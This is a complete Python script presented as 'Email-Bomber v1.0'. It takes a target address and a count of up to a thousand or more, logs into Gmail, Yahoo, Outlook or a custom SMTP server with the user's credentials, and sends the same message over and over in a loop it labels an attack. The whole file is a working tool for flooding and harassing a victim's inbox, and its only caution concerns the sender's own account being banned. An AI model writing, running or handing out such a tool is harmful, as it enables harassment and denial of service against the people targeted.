'''imports'''
import smtplib
import sys


class bcolors:
    BRIGHTGREEN='\033[1;32;40m'
    BRIGHTMAGENTA='\033[1;34;40m'
    DARKGRAY='\033[1;30;40m'
    GREEN='\033[92m'
    YELLOW='\033[93m'
    RED='\033[91m'

def banner():
    print(bcolors.GREEN + '~~> Email-Bomber v1.0 <~~')
    print(bcolors.DARKGRAY + '>> MADE WITH CODES <<')
    print(bcolors.BRIGHTMAGENTA + '''
⠀⠀⠀⠀⠀⠀⠀⢀⡤⠂⠀⠀⠀⠀⢀⣀⣤⠔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⣤⣀⠀⠀⠀⠀⠀⠐⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⣀⣴⣾⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣶⣤⣀⠀⠀⠘⣿⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⡿⠁⢀⣴⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣄⠀⠘⣿⣷⡀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⡿⠁⠀⠸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⠀⠀⠸⣿⣿⡄⠀⠀⠀
⠀⠀⣸⣿⣿⠃⠀⠀⠀⢿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀   AUTHOR: zRainerzz⠀⠀ ⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⢹⣿⣿⡄⠀⠀
⠀⢰⣿⣿⡏⠀⠀⠀⠀⠘⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡿⠀⠀⠀⠀⠀⣿⣿⣷⠀⠀
⠀⣿⣿⣿⠃⠀⠀⠀⠀⠀⢹⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⠀⠠⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠇⠀⠀⠀⠀⠀⢸⣿⣿⣇⠀
⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣤⣄⢠⣾⣿⣿⠃⠀⠀⠹⣿⣿⣷⠀⢀⣴⣿⣿⣿⣶⣶⣶⣦⣴⣿⣿⡏⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⠀
⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇
⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⣠⣤⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣤⣤⣄⡀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣧
⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿
⣿⣿⣿⣿⣤⣤⣤⣄⣀⠀⠀⠀⣀⣴⣿⣿⣿⡿⠿⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⡿⢿⣿⣿⣷⣄⡀⠀⠀⠀⣀⣠⣤⣤⣼⣿⣿⣿⡏
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣁⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠉⠉⠙⠛⠻⠿⢿⣿⣿⡿⠟⢁⣠⣾⣿⣿⣿⠿⣫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⢿⣿⣿⣿⣦⣄⠙⠻⣿⣿⣿⡿⠿⠛⠛⠉⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢀⣴⣿⣿⣿⠿⢋⣵⣾⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣷⣭⡛⢿⣿⣿⣷⣄⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠟⢁⣶⣿⣿⡿⠋⠁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠻⣿⣿⣿⣦⠉⠻⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⡿⠋⠀⠀⢸⣿⣿⣿⠁⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠸⣿⣿⣿⡄⠀⠈⠛⢿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣾⣿⣿⠟⠁⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠙⢿⣿⣿⣶⣄⣀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡇⠀
⠀⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡇⠀
⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀
⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀
⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣧⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀
⠀⢸⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀
⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⠀⠀
⠀⠘⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠀⠀
⠀⠀⢿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⡇⠀⠀
⠀⠀⠸⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠁⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⢻⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠂⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡄⠀⠀⠀⠀⠀⠀⣰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀''')
    

class Email_Bomber:
    count= 0

    def __init__(self):
        
        try:
            print(bcolors.RED + '\n ~~> Initializing program <~~')
            self.target=str(input(bcolors.GREEN + 'Enter Target Email ~: '))
            self.mode=int(input(bcolors.GREEN + 'Enter Bombing Mode (1,2,3,4)||1:(1000) 2:(500) 3:(250) 4:(custom) ~: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print("ERR0R, Invalid Option.  GoodBye")
                sys.exit(1)

        except Exception as e:
            print(f'ERR0R ~: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n ~~> SETTING UP THE BOMB 💣 <~~')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount ~: '))
            print(bcolors.RED + f'\n ~~>The selected BOMB mode is: {self.mode} and {self.amount} emails <~~')
        except Exception as e:
            print(f'ERR0R: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n ~~> SETTING UP THE EMAIL <~~')
            self.server=str(input(bcolors.GREEN + 'Enter Email Server || Select premade options  1:Gmail 2:Yahoo 3:Outlook ~: '))
            premade= ["1","2","3"]
            default_port=True
            if self.server not in premade:
                default_port=False
                self.port=int(input(bcolors.GREEN + ' Enter PORT number ~: '))

            if default_port== True:
                self.port=int(587)
            
            if self.server =='1':
                self.server='smtp.gmail.com'
            elif self.server =='2':
                self.server='smtp.mail.yahoo.com'
            elif self.server=='3':
                self.server='smtp-mail.outlook.com'

            self.fromAddr=str(input(bcolors.GREEN + 'Enter from ADDRESS ~: '))
            self.fromPwd=str(input(bcolors.GREEN + 'Enter from PASSWORD ~: '))
            self.subject=str(input(bcolors.GREEN + 'Enter SUBJECT ~: '))
            self.message=str(input(bcolors.GREEN + 'Enter MESSAGE ~: '))


            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' %(self.fromAddr, self.target, self.subject, self.message)

            self.s=smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            #ehlo is an electronic hello to the server
            self.s.starttls()
            #starting tls to make sure that the connection is secure
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
    
        except Exception as e:
            print(f'ERR0R: {e}')
    
    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count+=1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERR0R: {e}')
        
    def attack(self):
        print(bcolors.YELLOW + "\n ~~>... ATTACKING... <~~")
        for email in range(self.amount+1):
            self.send()
        
        self.s.close
        #logging out
        print(bcolors.YELLOW +'\n ~~> ATTACK FINISHED.')
        print( bcolors.BRIGHTGREEN + '\nFREE PALESTINE✌🏼<~~')
        sys.exit(0)



#remember not to test with your main email acc (gmail specially), spamming thousands of emails will maybe end up getting your account suspended, blocked or banned o  whatever.

if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()